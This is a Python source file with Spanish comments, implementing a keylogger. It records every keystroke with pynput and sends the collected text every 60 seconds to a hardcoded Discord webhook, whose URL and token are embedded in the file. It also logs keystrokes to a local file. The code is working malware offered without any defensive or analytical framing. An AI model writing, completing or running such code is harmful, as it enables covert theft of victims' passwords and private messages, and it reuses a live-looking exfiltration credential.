import os
import logging
from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener, Key
import requests
import sys

# URL del webhook
WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1257403688264270016/Nx2xq3OEwEK3bYNZn-3dCLaw7u_4O665GZKiV5wOofbg-B62wGUWtKKBtcpuQsv78q1z",
)
TIME_INTERVAL = 60


class Keylogger:
    def __init__(self, webhook_url, interval):
        """
        Inicializa el Keylogger con la URL del webhook y el intervalo de tiempo entre reportes.

        :param webhook_url: La URL del webhook de Discord donde se enviarán los logs.
        :param interval: Intervalo de tiempo (en segundos) entre cada reporte.
        """
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""
        self.setup_logging()

    def setup_logging(self):
        """
        Configura el sistema de logging para registrar eventos en un archivo.
        """
        logging.basicConfig(
            filename="keylog.txt",
            level=logging.DEBUG,
            format="%(asctime)s - %(levelname)s - %(message)s",
        )

    def validate_webhook(self, webhook_url):
        """
        Valida si la URL del webhook es válida.

        :param webhook_url: La URL del webhook de Discord.
        :return: True si la URL es válida, False en caso contrario.
        """
        try:
            response = requests.head(webhook_url)
            if response.status_code == 200:
                return True
            else:
                logging.error(
                    f"La URL del webhook no es válida (Código de estado: {response.status_code})"
                )
                return False
        except requests.RequestException as e:
            logging.error(f"No se pudo validar la URL del webhook: {str(e)}")
            return False

    def _report(self):
        """
        Envía el log actual al webhook y reinicia el log.
        """
        if self.log:
            try:
                self.webhook.send(self.log)
                logging.info("Log enviado correctamente a Discord.")
            except Exception as e:
                logging.error(f"No se pudo enviar el log a Discord: {str(e)}")
            finally:
                self.log = ""

      
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        """
        Maneja la pulsación de teclas y actualiza el log con la tecla presionada.

        :param key: La tecla que fue presionada.
        """
        try:
          
            if key in (Key.shift, Key.shift_r):
                return

           
            if key == Key.space:
                self.log += " "
            elif key == Key.enter:
                self.log += "\n"
            elif key == Key.backspace:
                self.log = self.log[:-1]
            elif key == Key.tab:
                if key == Key.alt_l or key == Key.alt_r:
                    self.log += " [ALT + TAB] "
                else:
                    self.log += "[TAB]"  
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                self.log += " [CTRL] "
            elif key == Key.alt_l or key == Key.alt_r:
                self.log += " [ALT] "
            elif hasattr(key, "char"):
                self.log += key.char
            else:
                self.log += f" [{key}] "  

        except Exception as e:
            logging.error(f"Error al manejar la pulsación de tecla: {str(e)}")

        logging.debug(f"Tecla presionada: {key}")

    def run(self):
        """
        Inicia el keylogger y comienza a escuchar las pulsaciones de teclas.
        """
        if not self.validate_webhook(self.webhook.url):
            sys.exit(1)

        self._report()

        try:
            with Listener(on_press=self._on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            logging.info(
                "Deteniendo el keylogger debido a la interrupción del usuario."
            )
        except Exception as e:
            logging.error(f"Error en el keylogger: {str(e)}")


if __name__ == "__main__":

    keylogger = Keylogger(WEBHOOK_URL, TIME_INTERVAL)
    keylogger.run()
